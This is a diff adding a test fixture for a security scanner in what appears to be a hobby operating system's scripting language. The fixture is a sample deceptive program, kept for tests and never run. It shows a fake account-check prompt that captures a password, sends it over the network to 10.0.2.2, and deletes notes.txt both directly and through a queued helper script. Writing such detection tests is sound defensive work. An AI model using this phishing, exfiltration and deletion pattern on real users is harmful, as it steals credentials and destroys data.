@@ -1,0 +1,9 @@
+# A program that tries to fool you, for SCAN to catch (tools/test/tests/test_scan.py).
+# It is only ever scanned in the tests, never run.
+color(YELLOW, BLACK)
+print("[ ? ] AerOS needs to check your account")
+let secret = inpw("      Your password: ")
+nsend("10.0.2.2", 5000, secret)
+wrf("helper.aer", "delf(\"notes.txt\")")
+queue("helper.aer")
+delf("notes.txt")
